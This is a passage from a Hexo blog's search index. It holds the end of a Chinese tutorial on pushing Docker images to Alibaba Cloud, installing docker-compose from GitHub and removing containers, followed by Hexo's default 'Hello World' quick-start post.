hexo-debug:1234</code></pre><blockquote><p>前面是需要打包的容器的id,后面是给镜像起的名字,冒号后面的是标签</p></blockquote><p>我这里使用的是阿里云的镜像仓库</p><p><img src="https://img-1317758194.cos.ap-nanjing.myqcloud.com/typoraimage-20230727110224450.png" alt="image-20230727110224450"></p><p>阿里云这边其实已经给了怎么用,这里这里只做一些简单的使用讲解和注意点</p><p>这些命令中的镜像版本号可以使用标签填写</p><p>其他的就不多介绍了.</p><h2 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h2><p>至此就实现了docker镜像了上传和拉取,用之前搭建好镜像制作容器,容器启动后里面的环境都是先前搭配好的可以直接用.</p><p>这里再介绍一个用于定义和运行多个Docker容器的工具docker-compose,</p><p>这个工具的版本要稍微新一点,旧版的会报错</p><pre><code>sudo curl -L https://github.com/docker/compose/releases/download/1.16.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</code></pre><pre><code>sudo chmod +x /usr/local/bin/docker-compose    #为其添加权限</code></pre><p>大致介绍一下一些常用的命令</p><p>需要注意的一点,需要先进入存在dockerfile的文件夹再输入下面的命令</p><pre><code>docker-compose up -d      #启动容器</code></pre><blockquote><p>-d的作用简单来说就是让容器运行的日志放在后台,这样就不会影响后续命令的执行</p></blockquote><pre><code>docker-compose down       #停止容器</code></pre><h2 id="删除卸载"><a href="#删除卸载" class="headerlink" title="删除卸载"></a>删除卸载</h2><p>删除容器</p><pre><code>docker rm hexo-debug      #这里可以用hexo-debug也可以用543cfb5f53dd</code></pre><p>删除镜像</p><pre><code>docker rmi hexo-debug      #这里可以用hexo-debug也可以用543cfb5f53dd</code></pre>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/07/21/hello-world/"/>
      <url>/2023/07/21/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
